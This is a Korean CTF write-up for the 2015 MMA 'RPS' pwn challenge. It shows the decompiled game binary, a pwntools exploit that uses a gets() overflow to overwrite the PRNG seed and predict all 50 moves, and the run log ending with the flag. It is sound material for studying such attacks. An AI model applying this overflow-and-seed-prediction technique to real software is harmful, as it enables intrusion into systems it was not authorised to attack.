# 2015 MMA - [PWN] RPS

## Key words

- overwrite random seed
- Pwntools(ctypes)

## Solution

문제는 다음과 같습니다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v_name; // [sp+0h] [bp-50h]@1
  unsigned int ptr; // [sp+30h] [bp-20h]@1
  int v6; // [sp+34h] [bp-1Ch]@21
  FILE *stream; // [sp+38h] [bp-18h]@1
  int v8; // [sp+44h] [bp-Ch]@18
  int v9; // [sp+48h] [bp-8h]@3
  int i; // [sp+4Ch] [bp-4h]@1

  stream = fopen("/dev/urandom", "r");
  fread(&ptr, 4uLL, 1uLL, stream);
  fclose(stream);
  printf("What's your name: ", 4LL);
  fflush(stdout);
  gets(&v_name);
  printf("Hi, %s\n", &v_name);
  puts("Let's janken");
  fflush(stdout);
  srand(ptr);
  for ( i = 0; i <= 49; ++i )
  {
    printf("Game %d/50\n", (unsigned int)(i + 1));
    printf("Rock? Paper? Scissors? [RPS]");
    fflush(stdout);
    do
    {
      v9 = getchar();
      if ( !v9 )
        break;
      if ( v9 == -1 )
      {
        v9 = 0;
        break;
      }
    }
    while ( v9 == 32 || v9 == 10 || v9 == 13 || v9 == 9 );
    if ( !v9 )
    {
      puts("Bye bye");
      fflush(stdout);
      return 0;
    }
    if ( v9 == 'R' )
    {
      v8 = 0;
    }
    else if ( v9 == 'S' )
    {
      v8 = 2;
    }
    else
    {
      if ( v9 != 'P' )
      {
        puts("Wrong input");
        fflush(stdout);
        return 1;
      }
      v8 = 1;
    }
    v6 = rand() % 3;
    printf("%s-%s\n", (&pname)[8 * v8], (&pname)[8 * v6]);
    if ( v6 == v8 )
    {
      puts("Draw");
      --i;
    }
    else
    {
      if ( (v6 + 1) % 3 != v8 )
      {
        puts("You lose");
        fflush(stdout);
        return 1;
      }
      puts("You win!!");
    }
    fflush(stdout);
  }
  printf("Congrats %s!!!!\n", &v_name);
  stream = fopen("flag.txt", "r");
  fgets(buf, 100, stream);
  puts(buf);
  fflush(stdout);
  return 0;
}
```

`/dev/urandom` 에서 가져온 4바이트 랜덤 값을 시드로 사용하여 가위 바위 보 게임을 하는 프로그램 입니다. 연속으로 50번을 이기면 플래그를 주게 되어 있습니다.

문제를 해결하기 위해 처음에 입력받은 이름을 이용하여 랜덤 시드를 덮었습니다. 그리고 저도 동일한 시드를 생성하면 서버와 제가 동일한 랜덤값이 나오기 때문에 계속 이기는 값을 만들 수 있습니다.

## Solution code

```python
from pwn import *
from ctypes import *

target = "./rps"

p = process(target)

libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
libc.srand(0x42424242)

print p.recv()

payload = "A" * 0x30
payload += "\x42\x42\x42\x42"

p.sendline(payload)
print p.recv()

RPS = ['R', 'P', 'S']

for i in xrange(50):
    ans = RPS[((libc.rand() % 3)+1)%3]
    print ans
    p.sendline(ans)
    print p.recv()
```

## Result

```
tbkim@ubuntu:~/ctf/pwnable/0021_2015_MMA_RPS$ python sol_rps.py 
[+] Starting local process './rps': pid 91980
What's your name: 
Hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Let's janken
Game 1/50
Rock? Paper? Scissors? [RPS]
R
Rock-Scissors
You win!!
Game 2/50
Rock? Paper? Scissors? [RPS]
R
Rock-Scissors
You win!!
Game 3/50
Rock? Paper? Scissors? [RPS]
S
Scissors-Paper
You win!!
Game 4/50
Rock? Paper? Scissors? [RPS]
P
Paper-Rock
You win!!
Game 5/50
Rock? Paper? Scissors? [RPS]
R
Rock-Scissors
You win!!
Game 6/50
Rock? Paper? Scissors? [RPS]
S
Scissors-Paper
You win!!
Game 7/50
Rock? Paper? Scissors? [RPS]
P
Paper-Rock
You win!!
Game 8/50
Rock? Paper? Scissors? [RPS]
P
Paper-Rock
You win!!
Game 9/50
Rock? Paper? Scissors? [RPS]
R
Rock-Scissors
You win!!
Game 10/50
Rock? Paper? Scissors? [RPS]
R
Rock-Scissors
You win!!
Game 11/50
Rock? Paper? Scissors? [RPS]
R
Rock-Scissors
You win!!
Game 12/50
Rock? Paper? Scissors? [RPS]
P
Paper-Rock
You win!!
Game 13/50
Rock? Paper? Scissors? [RPS]
P
Paper-Rock
You win!!
Game 14/50
Rock? Paper? Scissors? [RPS]
P
Paper-Rock
You win!!
Game 15/50
Rock? Paper? Scissors? [RPS]
R
Rock-Scissors
You win!!
Game 16/50
Rock? Paper? Scissors? [RPS]
P
Paper-Rock
You win!!
Game 17/50
Rock? Paper? Scissors? [RPS]
P
Paper-Rock
You win!!
Game 18/50
Rock? Paper? Scissors? [RPS]
P
Paper-Rock
You win!!
Game 19/50
Rock? Paper? Scissors? [RPS]
P
Paper-Rock
You win!!
Game 20/50
Rock? Paper? Scissors? [RPS]
P
Paper-Rock
You win!!
Game 21/50
Rock? Paper? Scissors? [RPS]
R
Rock-Scissors
You win!!
Game 22/50
Rock? Paper? Scissors? [RPS]
R
Rock-Scissors
You win!!
Game 23/50
Rock? Paper? Scissors? [RPS]
R
Rock-Scissors
You win!!
Game 24/50
Rock? Paper? Scissors? [RPS]
P
Paper-Rock
You win!!
Game 25/50
Rock? Paper? Scissors? [RPS]
P
Paper-Rock
You win!!
Game 26/50
Rock? Paper? Scissors? [RPS]
R
Rock-Scissors
You win!!
Game 27/50
Rock? Paper? Scissors? [RPS]
R
Rock-Scissors
You win!!
Game 28/50
Rock? Paper? Scissors? [RPS]
R
Rock-Scissors
You win!!
Game 29/50
Rock? Paper? Scissors? [RPS]
S
Scissors-Paper
You win!!
Game 30/50
Rock? Paper? Scissors? [RPS]
R
Rock-Scissors
You win!!
Game 31/50
Rock? Paper? Scissors? [RPS]
P
Paper-Rock
You win!!
Game 32/50
Rock? Paper? Scissors? [RPS]
P
Paper-Rock
You win!!
Game 33/50
Rock? Paper? Scissors? [RPS]
S
Scissors-Paper
You win!!
Game 34/50
Rock? Paper? Scissors? [RPS]
R
Rock-Scissors
You win!!
Game 35/50
Rock? Paper? Scissors? [RPS]
S
Scissors-Paper
You win!!
Game 36/50
Rock? Paper? Scissors? [RPS]
S
Scissors-Paper
You win!!
Game 37/50
Rock? Paper? Scissors? [RPS]
S
Scissors-Paper
You win!!
Game 38/50
Rock? Paper? Scissors? [RPS]
R
Rock-Scissors
You win!!
Game 39/50
Rock? Paper? Scissors? [RPS]
S
Scissors-Paper
You win!!
Game 40/50
Rock? Paper? Scissors? [RPS]
S
Scissors-Paper
You win!!
Game 41/50
Rock? Paper? Scissors? [RPS]
R
Rock-Scissors
You win!!
Game 42/50
Rock? Paper? Scissors? [RPS]
R
Rock-Scissors
You win!!
Game 43/50
Rock? Paper? Scissors? [RPS]
S
Scissors-Paper
You win!!
Game 44/50
Rock? Paper? Scissors? [RPS]
R
Rock-Scissors
You win!!
Game 45/50
Rock? Paper? Scissors? [RPS]
R
Rock-Scissors
You win!!
Game 46/50
Rock? Paper? Scissors? [RPS]
R
Rock-Scissors
You win!!
Game 47/50
Rock? Paper? Scissors? [RPS]
P
Paper-Rock
You win!!
Game 48/50
Rock? Paper? Scissors? [RPS]
R
Rock-Scissors
You win!!
Game 49/50
Rock? Paper? Scissors? [RPS]
P
Paper-Rock
You win!!
Game 50/50
Rock? Paper? Scissors? [RPS]
S
[*] Process './rps' stopped with exit code 0 (pid 91980)
Scissors-Paper
You win!!
Congrats AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB!!!!
MMA{treed_three_girls}
```
